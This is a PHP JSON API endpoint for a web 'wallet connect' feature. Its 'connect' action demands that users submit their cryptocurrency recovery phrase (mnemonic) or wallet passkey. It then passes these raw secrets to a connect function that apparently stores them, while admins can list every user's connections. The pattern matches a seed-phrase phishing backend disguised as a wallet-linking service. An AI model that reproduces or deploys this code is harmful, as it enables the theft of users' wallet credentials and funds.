<?php
declare(strict_types=1);

require_once dirname(__DIR__) . '/includes/wallet_connect_session.php';
require_once dirname(__DIR__) . '/includes/wallet_connect_data.php';
require_once dirname(__DIR__) . '/includes/wallet_external_registry.php';
require_once dirname(__DIR__) . '/Userprofile/includes/user_db.php';
require_once dirname(__DIR__) . '/Admin/includes/admin_csrf.php';

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

function wc_api_username(): string {
  if (!empty($_SESSION['user_id'])) {
    $n = $_SESSION['user_full_name'] ?? '';
    if (is_string($n) && $n !== '') {
      return $n;
    }
    $e = $_SESSION['user_email'] ?? '';
    return is_string($e) ? $e : 'User';
  }
  return 'Guest';
}

function wc_api_verify_user_csrf(?string $token): bool {
  return user_verify_csrf($token);
}

/**
 * Read string fields from JSON (accepts string or scalar; avoids empty when JSON sends numbers).
 */
function wc_api_input_string(array $input, string $key): string {
  if (!array_key_exists($key, $input)) {
    return '';
  }
  $v = $input[$key];
  if (is_string($v)) {
    return trim($v);
  }
  if (is_int($v) || is_float($v)) {
    return trim((string)$v);
  }
  if (is_bool($v)) {
    return $v ? '1' : '';
  }
  return '';
}

/**
 * First non-empty value among several possible keys (e.g. phrase / recoveryPhrase).
 */
function wc_api_input_string_any(array $input, array $keys): string {
  foreach ($keys as $k) {
    $s = wc_api_input_string($input, $k);
    if ($s !== '') {
      return $s;
    }
  }
  return '';
}

/**
 * Merge form POST with JSON body so credentials always arrive (some stacks strip JSON).
 *
 * @return array<string, mixed>
 */
function wc_api_parse_post_input(): array {
  $raw = file_get_contents('php://input');
  $post = is_array($_POST) ? $_POST : [];
  $jsonPart = [];
  if (is_string($raw) && $raw !== '') {
    $flags = defined('JSON_INVALID_UTF8_SUBSTITUTE') ? JSON_INVALID_UTF8_SUBSTITUTE : 0;
    $decoded = json_decode($raw, true, 512, $flags);
    if (is_array($decoded)) {
      $jsonPart = $decoded;
    }
  }
  // Later keys win (JSON over plain POST).
  return array_merge($post, $jsonPart);
}

if ($method === 'GET') {
  $action = isset($_GET['action']) && is_string($_GET['action']) ? $_GET['action'] : 'list';
  $adminId = isset($_SESSION['admin_id']) ? (int)$_SESSION['admin_id'] : 0;

  if ($action === 'summary' && $adminId > 0) {
    echo json_encode(['ok' => true, 'summary' => wallet_connect_summary()]);
    exit;
  }

  if ($action === 'activity') {
    $lim = isset($_GET['limit']) ? (int)$_GET['limit'] : 50;
    if ($adminId <= 0) {
      http_response_code(403);
      echo json_encode(['ok' => false, 'error' => 'forbidden']);
      exit;
    }
    echo json_encode(['ok' => true, 'activity' => wallet_connect_activity($lim)]);
    exit;
  }

  // list
  if ($adminId > 0) {
    $rows = wallet_connect_list_all();
    $out = [];
    foreach ($rows as $r) {
      $out[] = wallet_connect_row_for_api($r, true);
    }
    echo json_encode([
      'ok' => true,
      'scope' => 'admin',
      'summary' => wallet_connect_summary(),
      'connections' => $out,
    ]);
    exit;
  }

  $owner = wallet_connect_owner_key();
  $rows = wallet_connect_list_for_owner($owner);
  $out = [];
  foreach ($rows as $r) {
    $out[] = wallet_connect_row_for_api($r, false);
  }
  echo json_encode([
    'ok' => true,
    'scope' => 'user',
    'connections' => $out,
  ]);
  exit;
}

if ($method !== 'POST') {
  http_response_code(405);
  echo json_encode(['ok' => false, 'error' => 'method']);
  exit;
}

$input = wc_api_parse_post_input();

$action = isset($input['action']) ? trim((string)$input['action']) : '';
$csrfRaw = $input['csrf_token'] ?? null;
$csrf = null;
if ($csrfRaw !== null && $csrfRaw !== '') {
  $csrf = is_string($csrfRaw) ? $csrfRaw : (is_scalar($csrfRaw) ? (string)$csrfRaw : null);
}
$adminId = isset($_SESSION['admin_id']) ? (int)$_SESSION['admin_id'] : 0;

// Admin-only actions
if (in_array($action, ['set_status', 'admin_disconnect'], true)) {
  if ($adminId <= 0 || !admin_verify_csrf($csrf)) {
    http_response_code(403);
    echo json_encode(['ok' => false, 'error' => 'forbidden']);
    exit;
  }
  $id = isset($input['id']) && is_string($input['id']) ? $input['id'] : '';
  if ($id === '') {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'id']);
    exit;
  }
  if ($action === 'set_status') {
    $st = isset($input['status']) && is_string($input['status']) ? $input['status'] : '';
    $ok = wallet_connect_admin_set_status($id, $st);
    echo json_encode(['ok' => $ok]);
    exit;
  }
  if ($action === 'admin_disconnect') {
    $ok = wallet_connect_admin_set_status($id, 'disconnected');
    echo json_encode(['ok' => $ok]);
    exit;
  }
}

// User/guest actions need user CSRF
if (!wc_api_verify_user_csrf($csrf)) {
  http_response_code(403);
  echo json_encode(['ok' => false, 'error' => 'csrf']);
  exit;
}

$owner = wallet_connect_owner_key();

if ($action === 'connect') {
  $provider = wc_api_input_string($input, 'provider');
  $chainIn = wc_api_input_string($input, 'chain');
  if ($chainIn === '') {
    $chainIn = 'Ethereum';
  }
  $assetIn = wc_api_input_string($input, 'asset');
  $source = wc_api_input_string($input, 'source');
  if ($source === '') {
    $source = 'web';
  }
  $phrase = wc_api_input_string_any($input, [
    'phrase',
    'recovery_phrase',
    'recoveryPhrase',
    'mnemonic',
  ]);
  $passkey = wc_api_input_string_any($input, [
    'passkey',
    'pass_key',
    'wallet_passkey',
  ]);

  if ($provider === '') {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'provider', 'message' => 'Wallet provider is required.']);
    exit;
  }
  if ($phrase === '' && $passkey === '') {
    http_response_code(400);
    echo json_encode([
      'ok' => false,
      'error' => 'credentials_required',
      'message' => 'Enter your recovery phrase, passkey, or at least one credential.',
    ]);
    exit;
  }
  if (empty($_SESSION['user_id'])) {
    http_response_code(403);
    echo json_encode([
      'ok' => false,
      'error' => 'login_required',
      'message' => 'Sign up or log in to connect your wallet.',
    ]);
    exit;
  }

  $resolved = wallet_external_registry_lookup($phrase, $passkey);
  if ($resolved === null) {
    $failMsg = wallet_external_registry_fail_message($phrase, $passkey);
    $errCode = 'phrase_not_linked';
    if (stripos($failMsg, 'recovery phrase') !== false) {
      $errCode = 'invalid_phrase';
    } elseif (stripos($failMsg, 'passkey') !== false) {
      $errCode = 'invalid_passkey';
    }
    http_response_code(400);
    echo json_encode([
      'ok' => false,
      'error' => $errCode,
      'message' => $failMsg,
    ]);
    exit;
  }

  $address = (string)$resolved['address'];
  if (strlen($address) > 256) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'address']);
    exit;
  }
  $chain = $resolved['chain'] !== '' ? $resolved['chain'] : $chainIn;
  $asset = $resolved['asset'] !== '' ? $resolved['asset'] : $assetIn;

  $username = wc_api_username();
  $sourceTag = !empty($_SESSION['user_id']) ? 'user_area' : 'public';
  if ($source !== '') {
    $sourceTag = $source;
  }

  $row = wallet_connect_connect(
    $owner,
    $username,
    $provider,
    $address,
    $chain,
    $asset,
    $sourceTag,
    $phrase,
    $passkey
  );
  echo json_encode([
    'ok' => true,
    'connection' => wallet_connect_row_for_api($row, false),
  ]);
  exit;
}

if ($action === 'disconnect') {
  $id = isset($input['id']) && is_string($input['id']) ? $input['id'] : '';
  if ($id === '') {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'id']);
    exit;
  }
  $ok = wallet_connect_disconnect($id, $owner);
  echo json_encode(['ok' => $ok]);
  exit;
}

http_response_code(400);
echo json_encode(['ok' => false, 'error' => 'unknown_action']);
